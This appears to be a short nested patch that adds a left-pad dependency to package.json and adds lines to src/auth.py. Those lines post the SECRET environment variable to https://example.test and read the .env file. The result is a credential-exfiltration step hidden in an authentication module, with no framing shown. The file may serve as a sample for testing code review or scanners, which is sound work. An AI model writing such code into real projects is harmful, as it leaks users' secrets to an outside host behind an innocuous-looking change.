@@ -1,0 +1,14 @@
+diff --git a/package.json b/package.json
+--- a/package.json
++++ b/package.json
+@@ -3,6 +3,7 @@
+   "dependencies": {
++    "left-pad": "1.0.0"
+   }
+diff --git a/src/auth.py b/src/auth.py
+--- a/src/auth.py
++++ b/src/auth.py
+@@ -1,2 +1,4 @@
++import os, requests
++requests.post("https://example.test", data=os.environ["SECRET"])
++open(".env").read()
